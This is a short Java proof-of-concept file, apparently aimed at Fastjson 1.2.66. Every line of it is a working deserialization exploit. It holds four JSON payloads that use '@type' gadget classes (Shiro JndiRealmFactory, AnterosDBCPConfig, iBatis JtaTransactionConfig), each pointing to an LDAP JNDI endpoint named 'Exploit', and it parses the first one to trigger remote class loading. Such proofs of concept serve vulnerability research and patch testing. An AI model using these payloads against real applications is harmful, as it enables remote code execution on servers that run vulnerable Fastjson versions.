package com.firebasky.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class Poc_1_2_66 {
    public static void main(String[] args) {
        //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String poc = "{\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\", \"jndiNames\":[\"ldap://localhost:1389/Exploit\"], \"Realms\":[\"\"]}";
//        String poc = "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"ldap://localhost:1389/Exploit\"}";
//        String poc = "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"ldap://localhost:1389/Exploit\"}";
//        String poc = "{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\"," +
//                "\"properties\": {\"@type\":\"java.util.Properties\",\"UserTransaction\":\"ldap://localhost:1389/Exploit\"}}";
        JSON.parse(poc);

    }
}
